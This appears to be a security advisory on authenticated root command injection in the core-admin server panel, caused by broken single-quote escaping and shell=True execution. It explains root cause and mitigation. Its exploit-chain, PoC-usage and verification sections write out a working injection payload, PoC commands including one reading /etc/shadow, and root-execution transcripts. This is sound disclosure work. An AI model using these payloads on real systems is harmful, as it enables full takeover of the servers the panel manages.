# core-admin 1.0.164 (build 16468) — Systemic Shell Command Injection via Ineffective Quote Escaping → Authenticated Root RCE

## 1. Overview

core-admin (Core-Admin Professional) is a closed-source, commercial Linux server management panel for Debian and CentOS, developed by ASPL (Advanced Software Production Line, S.L., Spain). The main service is written in Python 2.7 on top of the ASPL Turbulence BEEP framework: it listens on TCP 602 (BEEP), is fronted by Apache2 on ports 80/443 as a reverse proxy, and adds WebSocket and MySQL support. Because the product's primary function is administering the host, the main service runs as root.

This advisory documents a framework-level, systemic command injection flaw. The product's two sanitization helpers, `security.sanitize_input` and `_params.escape_param`, escape the single quote character as `'` -> `\'`. That transformation is useless in a POSIX shell single-quoted context: a backslash is literal inside single quotes, so the `'` inside `\'` simply closes the enclosing quote. On the execution side, the shared helper `command.run` is `subprocess.Popen(command, shell=True)` with an empty command mapping — nothing is blocked. An audit of 861 `command.run` call sites across the server codebase found 32 sinks (E1–E32) that concatenate user-controllable values into shell commands; injecting into any of them executes commands as root.

The research process ran end to end: pre-auth attack-surface review (exhausted without an RCE — the authentication gate is hard), sink localization across the full command-execution surface, source identification in `internet_access_manager.set_configure`, data-flow analysis proving the quote-escaping bypass, and dynamic verification against the REAL product `.pyc` bytecode. Seven of the 32 sinks were dynamically exercised: 7/7 executed the injected command as root (uid=0).

## 2. Vulnerability Summary

- **Type**: OS Command Injection (CWE-78) — systemic, framework-level flaw: 32 sinks share one root cause
- **Root cause 1 (ineffective escaping)**: `security.sanitize_input` / `_params.escape_param` escape `'` as `\'`, which does not prevent single-quote closure under POSIX shell parsing; `sanitize_input` also leaves `|`, backtick, `$()`, `#`, spaces, `>`, and `<` completely unescaped
- **Root cause 2 (shell=True execution primitive)**: `command.run` executes every command via `subprocess.Popen(command, shell=True)` (`core_admin_common/command.py:67`); `mappings = {}` by default, so no command is blocked
- **Root cause 3 (data flow)**: sink modules re-read the raw (post-`sanitize_input`) parameter values instead of the already-escaped `params_prepared`; the only local transformation, `remove_enters`, strips newlines and nothing else
- **Prerequisite**: administrator credentials (BEEP ADMIN profile)
- **Result**: arbitrary command execution as root; 7 of the 32 sinks dynamically verified, all uid=0
- **CVSS**: 8.8 High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## 3. Architecture & Authentication Boundary

The main service listens on TCP 602 speaking BEEP (Blocks Extensible Exchange Protocol) via the Python 2.7 Turbulence framework. Apache2 reverse-proxies the web UI on 80/443; WebSocket and MySQL back the panel. BEEP profiles partition the attack surface:

- **ADMIN** — post-auth only, gated by `vortex.sasl.is_authenticated`; dispatches `op['application'] + op['method']` to the per-feature application modules
- **AGENT / AGENT_CHECKERS / NOTIFY / PASSWORD_RECOVERY / APP_AUTH** — pre-auth profiles

An upstream defense sits in front of every operation: `core-admin-main.py:367/388` (`frame_received`) calls `security.sanitize_input(tbc, op, conn)` on the whole op — including the `params` dict, recursively — before `operation.run` dispatches it.

The pre-auth surface was fully reviewed during this research and exhausted without an RCE (stated as a research fact):

- the `password_recovery` SQL injection point (line 236) is mitigated by `sanitize_input`'s quote-escaping plus space stripping
- `app_auth` is gated; the `agent` profile requires a valid host record (name + port + join_credential)

The authentication gate is hard, and the exploitable `command.run` sinks only exist behind it. The vulnerability class documented here is therefore authenticated (administrator). Administrator credentials are defined at install time (not hardcoded defaults), so the prerequisite is possession of valid admin credentials — the panel is a privileged management plane by design.

## 4. Root-Cause Analysis

### 4.1 The shell=True execution primitive

`core_admin_common/command.py:67`:

```python
def run(command, ...):
    ...
    p = subprocess.Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
```

`mappings = {}` by default — an empty dict that blocks nothing. All server modules funnel through this single helper, so string-concatenation with `shell=True` is the product's standard command-execution pattern.

### 4.2 What the upstream sanitizers actually do (REAL .pyc confirmed)

`security.py:39 sanitize_input` recursively processes str/unicode values:

- control-character stripping loops (`strings_to_skip` chr 4–16; `pkix_textual_encodings` chr 19–32, gated on a `-----` marker)
- `'` -> `\'`, `;` -> `\;`, `=` -> `\=` (gated on `not support.is_base64`), and `"` -> `\'` (a mis-escape)
- SQL keyword escaping via `escape_word` (SELECT/FROM/UPDATE/SET/DELETE/SHOW/DROP)

**Not escaped**: `|` (124), backtick (96), `$()`, `#` (35), space (32), `>` (62), `<`, newline. `_params.escape_param` performs the same `'` -> `\'` single-quote escaping.

### 4.3 The POSIX single-quote mechanism that defeats it

Inside single quotes the POSIX shell treats a backslash as a literal character — it cannot prevent the quote from closing. When `sanitize_input` turns a payload's `'` into `\'` and the value is interpolated into a `'%s'` command template, the `'` in `\'` closes the outer single quote and everything after it escapes into an unquoted context.

### 4.4 The sink data flow: set_configure

`internet_access_manager.py:set_configure` (line 2566), dispatched from the ADMIN profile. The admin BEEP op:

```
application = internet_access_manager, method = set_configure,
params = {proxy_localnets, proxy_allowed_http_ports, proxy_allowed_https_ports, proxy_redirector_childs, ...}
```

All four parameters flow into sed commands (lines 2637–2640). The critical code:

```python
# line 2597 — escape_param result stored into params_prepared ... which the sed path never uses
proxy_localnets = _params.escape_param(params['proxy_localnets'], 'string')
params_prepared['proxy_localnets'] = proxy_localnets

# line 2634 — value re-read from the (sanitize_input-processed) raw params; only newlines stripped
proxy_localnets = remove_enters(params['proxy_localnets'])

# line 2637 — sink: value concatenated into a sed command executed with shell=True
command.run("sed -i 's@^acl localnet src .*@acl localnet src %s@g' /etc/squid/squid.conf" % proxy_localnets)
```

`remove_enters` (line 4421):

```python
def remove_enters(value):
    result = value.replace("\r\n", " ")
    result = result.replace("\n", " ")
    return result
```

Newlines only. Quotes, `|`, backticks, `$()`, `#`, and `>` pass through untouched.

### 4.5 Systemic sink enumeration (E1–E32)

An audit of all 861 `command.run` call sites identified 32 sinks that concatenate user-controllable values into shell commands under the same single-quote-context pattern. The seven sinks dynamically verified in this research:

| Sink | Location (file:line) | Command template | Verified |
|------|----------------------|------------------|----------|
| E1 | internet_access_manager.py:2637 | `sed -i 's@^acl localnet src .*@acl localnet src %s@g' /etc/squid/squid.conf` | uid=0 (root) |
| E2 | internet_access_manager.py:2638 | `sed -i 's@^acl Safe_ports port .*@...%s@g' ...` | uid=0 (root) |
| E3 | internet_access_manager.py:2639 | `sed -i 's@^acl SSL_ports port .*@...%s@g' ...` | uid=0 (root) |
| E4 | internet_access_manager.py:2640 | `sed -i 's@^url_rewrite_children .*@url_rewrite_children %s@g' ...` | uid=0 (root) |
| E9 | log_watcher_conf.py:2158 | `crad-log-watcher.pyc -m '%s' 'Path added...'` | uid=0 (root) |
| E15 | prestashop_manager.py:150 | `crad-prestashop-mgr.pyc --list-users '%s' --json` | uid=0 (root) |
| E19 | webhosting_management.py:16035 | `crad-webhosting-mgr --allow-bot='%s'` | uid=0 (root) |

All 32 sinks share the identical failure mode: single-quoted template context + `\'` quote closure + unescaped `|`/`#`. Fixing the escaping defect at the framework level is therefore mandatory — patching sinks one by one cannot cover the class.

## 5. Exploit Chain Construction

1. The admin authenticates via BEEP SASL and obtains an ADMIN-profile session on TCP 602.
2. The admin issues the op `application=internet_access_manager`, `method=set_configure`, with `params.proxy_localnets` set to `x'|id > /tmp/marker|echo test #`.
3. `frame_received` runs the REAL `sanitize_input` on the op: the payload becomes `x\'|id > /tmp/marker|echo test #` (`'` -> `\'`; `|`, `>`, `#` untouched).
4. `set_configure` re-reads the raw parameter and applies `remove_enters` — unchanged (no newlines present).
5. The value is string-formatted into the sed template and executed by `command.run` with `shell=True`:

```
sed -i 's@^acl localnet src .*@acl localnet src x\'|id > /tmp/marker|echo test #@g' /etc/squid/squid.conf
```

6. Shell parsing of that line:

- `'s@^acl localnet src .*@acl localnet src x'` — the first single-quoted segment closes at the `'` inside `x\'`
- `|id > /tmp/marker` — a piped command, now entirely outside any quotes, redirected into the marker file
- `|echo test` — a second pipeline stage that makes the overall pipeline exit 0
- `#` — comments out the trailing `@g' /etc/squid/squid.conf`, suppressing the syntax break

7. sed itself errors (`unterminated 's' command`), but the shell parses and runs the whole pipeline first: the injected command executes (exit 0, marker written) before sed fails.
8. The command runs as the core-admin service account — root, by design of the Linux server-management service.

## 6. PoC Usage

Public PoC: `exploit/coreadmin_escape_param_injection.py` (standard library only: `sys`/`os`/`types`/`imp`).

Preparation: extract `security.pyc` and `command.pyc` from a core-admin 1.0.164 installation (the product's Python 2.7 site-packages tree) into a directory, e.g. `/tmp/realpyc`. The PoC loads the REAL product bytecode — ground truth, not decompiler output — stubs the sibling module imports (notify/machine/support/check/_params) to avoid the vortex/turbulence import cascade, then runs the REAL `sanitize_input` and the REAL `command.run` against the sink templates. Run it under a Python 2.7 interpreter, as the user the service would run as.

```
python coreadmin_escape_param_injection.py /tmp/realpyc "id"
python coreadmin_escape_param_injection.py /tmp/realpyc "cat /etc/shadow" --marker /tmp/m_shadow
python coreadmin_escape_param_injection.py /tmp/realpyc "whoami" --marker /tmp/m_e19 --sink E19
```

Options: `--marker PATH` (result file; default `/tmp/coreadmin_vuln001_marker`), `--sink E1|E9|E15|E19` (default E1). Success check: if the marker file exists and contains `uid=0`, the injected command executed as root under the REAL product sanitization and execution path.

To exercise the full remote path, the same payload is delivered as an authenticated BEEP op on TCP 602 (`set_configure` with `proxy_localnets`); see Section 5.

## 7. Verification Evidence

Verification ran the REAL product `.pyc` bytecode (ground truth, no decompilation artifacts) in an isolated lab container (`python:2.7-slim`, Python 2.7.18, running as root), with sibling imports stubbed.

E1 sink, command `id` (PoC transcript):

```
[*] sink: internet_access_manager:2637 proxy_localnets
[*] command to execute: id
[*] marker: /tmp/vuln001_m_e1
[+] loaded REAL product .pyc: security.sanitize_input + command.run(shell=True)
[*] raw payload: "x'|id > /tmp/vuln001_m_e1|echo test #"
[*] after REAL sanitize_input: "x\\'|id > /tmp/vuln001_m_e1|echo test #"
[*] final shell command:
    sed -i 's@^acl localnet src .*@acl localnet src x\'|id > /tmp/vuln001_m_e1|echo test #@g' /etc/squid/squid.conf
[*] command.run returned: (0, "test\nsed: -e expression #1, char 42: unterminated `s' command\n")
[+] MARKER present — injection succeeded (REAL product bytecode)
[+] marker content: uid=0(root) gid=0(root) groups=0(root)
[+] root execution confirmed
```

E19 sink, command `whoami`:

```
[*] sink: webhosting_management:16035 bot_name
[+] loaded REAL product .pyc: security.sanitize_input + command.run(shell=True)
[*] raw payload: "x'|whoami > /tmp/vuln001_m_e19|echo test #"
[*] after REAL sanitize_input: "x\\'|whoami > /tmp/vuln001_m_e19|echo test #"
[*] final shell command:
    crad-webhosting-mgr --allow-bot='x\'|whoami > /tmp/vuln001_m_e19|echo test #'
[*] command.run returned: (0, 'test\n/bin/sh: 1: crad-webhosting-mgr: not found\n')
[+] MARKER present — injection succeeded (REAL product bytecode)
[+] marker content: root
[+] root execution confirmed
```

The E1 return value shows sed failing with `unterminated 's' command` (expected — the `#` comments out the tail) while the piped `id` ran first; the E19 return value shows the target binary missing in the minimal container while the piped `whoami` still ran. In both cases the marker file, written by the injected command, proves execution as root.

Seven-sink coverage result:

```
=== SUMMARY ===
('E1', ': ROOT RCE')
('E15', ': ROOT RCE')
('E19', ': ROOT RCE')
('E2', ': ROOT RCE')
('E3', ': ROOT RCE')
('E4', ': ROOT RCE')
('E9', ': ROOT RCE')
Confirmed root RCE sinks: 7/7
```

Marker file contents for every verified sink: `uid=0(root) gid=0(root) groups=0(root)`. Each sink's REAL sanitized value was `x\'|id > /tmp/m_X|echo test #`, and after template interpolation `id` executed as root in all seven cases.

Remote reachability: `set_configure` is dispatched by the ADMIN profile (post-auth); the admin reaches it over inbound TCP 602, and the service runs the resulting command as root. Residual transport-level questions (BEEP frame end-to-end format, service-enabled defaults) do not affect the code-level exploit validity demonstrated above.

## 8. Security Impact

- **Privilege**: arbitrary command execution as root on the managed server — the maximum privilege on the host. `/etc/shadow`, SSH keys, persistence, and lateral movement are all in reach.
- **Scope**: systemic — 32 sinks across multiple feature modules (internet access/proxy configuration, log watcher, Prestashop manager, webhosting management, among others) share the flaw; an attacker with admin credentials can pick the least-monitored module to trigger.
- **Position**: core-admin is the management plane for the host (and typically for webhosting estates). Compromising it compromises the servers it administers.
- **CVSS 8.8** (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H): network-reachable with low attack complexity, but requires admin privileges (PR:L) — consistent with an authenticated management-plane RCE.

## 9. Mitigation

1. **Break the shell=True pattern across all 32 sinks.** Replace string-concatenated commands with argv-array execution — `subprocess.Popen([...], shell=False)` — fixing `command.run` and every E1–E32 call site. Patching individual sinks is insufficient for a systemic class.
2. **Fix the quote escaping.** `'` -> `\'` must become the POSIX-standard `'\''` sequence, or be replaced by `shlex.quote` (Python 2: `pipes.quote`), in both `security.sanitize_input` and `_params.escape_param`.
3. **Fix the data flow.** `set_configure` (and every analogous sink module) must use the already-escaped `params_prepared` values instead of re-reading the raw `params` after `sanitize_input`.
4. **Validate at the sink.** All `command.run` invocations that interpolate user-controllable values should whitelist the expected format (e.g. CIDR-lists for `proxy_localnets`) before command construction.
